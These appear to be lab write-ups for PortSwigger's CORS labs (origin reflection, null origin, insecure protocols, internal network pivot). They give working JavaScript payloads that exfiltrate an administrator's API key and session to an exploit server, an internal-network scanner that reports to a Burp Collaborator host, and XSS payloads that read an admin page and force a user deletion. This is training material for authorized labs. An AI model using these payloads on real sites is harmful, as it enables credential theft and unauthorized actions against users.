---
description: https://portswigger.net/web-security/cors
---

# Cross-origin resource sharing (CORS)

### Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

```
GET /accountDetails HTTP/1.1
Host: acd41f011fd21bd3c0b6040200f00050.web-security-academy.net
Cookie: session=CzIFnhxFY2m4km3PLX7BbzA6erdv5uXc
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://acd41f011fd21bd3c0b6040200f00050.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "sF3gLC5i9dYFVn4SYjcDyxyquGSXRsm0",
  "sessions": [
    "CzIFnhxFY2m4km3PLX7BbzA6erdv5uXc"
  ]
}
```

**Added to Request Header:**

`Origin: https://example.com`

**In response:**

`Access-Control-Allow-Origin: https://example.com`

**Exploit Server ->**

```
Body:

   <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://acd41f011fd21bd3c0b6040200f00050.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();
   
      function reqListener() {
          location='/log?key='+this.responseText;
      };
   </script>
```

`GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22TOW9opFknYFAvYcFwQu1Vvv3zs4U4w6h%22,%20%20%22sessions%22:%20[%20%20%20%20%22csKpvidUNfKVqZrlWGUtVQgCdfJzmN5F%22%20%20]} HTTP/1.1`

### Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

```
GET /accountDetails HTTP/1.1
Host: ac321f741f7ea952c1af00c500370089.web-security-academy.net
Cookie: session=1RNZX3Q3treQrrpFpIouYozImGd0SMmN
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ac321f741f7ea952c1af00c500370089.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "0hrZ14QSvwIA0QzEGoTlTvLPhNFJfj8E",
  "sessions": [
    "1RNZX3Q3treQrrpFpIouYozImGd0SMmN"
  ]
}
```

**Added to Request Header:**

`Origin: null`

**In response:**

`Access-Control-Allow-Origin: null`

**Exploit Server ->**

```
Body:

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac321f741f7ea952c1af00c500370089.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
    location='https://exploit-ac681f2f1fd1a9bfc17a008801770069.web-security-academy.net/log?key='+this.responseText;
    };
    </script>"></iframe>
```

`GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22Ef0XwT5SgdcjS3LDAFyogg3o60t6cMk9%22,%20%20%22sessions%22:%20[%20%20%20%20%220MpQzhjpON6KBee92JyBAl3TRr5R0LT0%22%20%20]} HTTP/1.1`

### Lab: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

```
GET /?productId=1&storeId=1 HTTP/1.1
Host: stock.ac851f671e93b3f7c075afe800410040.web-security-academy.net

https://stock.ac851f671e93b3f7c075afe800410040.web-security-academy.net/?productId=1&storeId=1

/?productId=<script>alert(0)</script>&storeId=1
```

There is a XSS at productId parameter.

```
GET /accountDetails HTTP/1.1
Host: ac851f671e93b3f7c075afe800410040.web-security-academy.net
Cookie: session=e8TRJ1v84JhKHPm31lkovNNOgPKz8UNf
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ac851f671e93b3f7c075afe800410040.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Response:

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "Co4v7XetDCHZp2RtQB8P5CGBlZgkoGWF",
  "sessions": [
    "e8TRJ1v84JhKHPm31lkovNNOgPKz8UNf"
  ]
}
```

**Added to Request Header:**

`Origin: http://subdomain.ac851f671e93b3f7c075afe800410040.web-security-academy.net/`

**In response:**

`Access-Control-Allow-Origin: http://subdomain.ac851f671e93b3f7c075afe800410040.web-security-academy.net/`

**Exploit Server ->**

```
Body:

   <script>
      document.location="http://stock.ac851f671e93b3f7c075afe800410040.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac851f671e93b3f7c075afe800410040.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ac6d1f791ea0b359c076afec01970006.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
   </script>
```

`GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22mWZcerNdn5oWnL04a3gG6wq9r83y2QCz%22,%20%20%22sessions%22:%20[%20%20%20%20%22j9p7rDfdqMwzj8phmOIcLwJHVu02Xl6s%22%20%20]} HTTP/1.1`

### Lab: CORS vulnerability with internal network pivot attack

This website has an insecure CORS configuration in that it trusts all internal network origins.

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user.

We checked cors vulnerability exists.

```
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://ng7tyefwag7aqw5tjno7oqp1lsrif7.burpcollaborator.net',true);
   req.send();

   function reqListener() {
       location='https://ng7tyefwag7aqw5tjno7oqp1lsrif7.burpcollaborator.net/log?key='+this.responseText;
   };
</script>
```

We can find the internal address with this script. It scans 192.168.0.0/24 IP block, then it makes get request to collaborator address.

```
<script>
  var q = [], collaboratorURL = 'http://ng7tyefwag7aqw5tjno7oqp1lsrif7.burpcollaborator.net/';
  for(i=1;i<=255;i++){
    q.push(
    function(url){
      return function(wait){
      fetchUrl(url,wait);
      }
    }('http://192.168.0.'+i+':8080'));
  }
  for(i=1;i<=20;i++){
    if(q.length)q.shift()(i*100);
  }
  function fetchUrl(url, wait){
    var controller = new AbortController(), signal = controller.signal;
    fetch(url, {signal}).then(r=>r.text().then(text=>
      {
      location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
    }
    ))
    .catch(e => {
    if(q.length) {
      q.shift()(wait);
    }
    });
    setTimeout(x=>{
    controller.abort();
    if(q.length) {
      q.shift()(wait);
    }
    }, wait);
  }
</script>
```

**Response ->**

```
/?ip=192.168.0.117:8080&code=...
...
<h1>Login</h1>
<section>
    <form class=login-form method=POST action=/login>
        <input required type="hidden" name="csrf" value="qOUuxYtjCrGW1lo0n5QGjZM6rETcAmPd">
        <label>Username</label>
        <input required type=username name="username">
        <label>Password</label>
        <input required type=password name="password">
        <button class=button type=submit> Log in </button>
```

It seems the user is not logged in. We can bypass it with XSS. But first, we need to find injection point to XSS. We found username parameter as injectable.

```
<script>
  function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
    {
      xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
    }
    ))
  }
  
  fetchUrl("http://192.168.0.117:8080", "http://ng7tyefwag7aqw5tjno7oqp1lsrif7.burpcollaborator.net");
</script>
```

**Response ->**

`GET /?foundXSS=1 HTTP/1.1`

With this XSS, we tried to access admin page.

```
<script>
  function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
    {
      xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
    }
    ))
  }
  
  fetchUrl("http://192.168.0.117:8080", "http://ng7tyefwag7aqw5tjno7oqp1lsrif7.burpcollaborator.net");
</script>
```

**Response ->**

```
<div theme="">
    <section class="maincontainer">
      <div class="container is-page">
          <header class="navigation-header">
              <section class="top-links">
                  <a href="/">Home</a><p>|</p>
                  <a href="/admin">Admin panel</a><p>|</p>
                  <a href="/my-account?id=administrator">My account</a><p>|</p>
              </section>
          </header>
          <header class="notification-header">
          </header>
          <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
              <input required="" type="hidden" name="csrf" value="QFbz78LF9vxTEIep6Rewk3XAyt8NiDmK">
              <label>Username</label>
              <input required="" type="text" name="username">
              <button class="button" type="submit">Delete user</button>
          </form>
        </div>
    </section>
</div>
```

Finally we can delete the user.

```
<script>
  function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  
  function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
    {
      xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
    }
    ))
  }
  
  fetchUrl("http://192.168.0.117:8080");
</script>
```
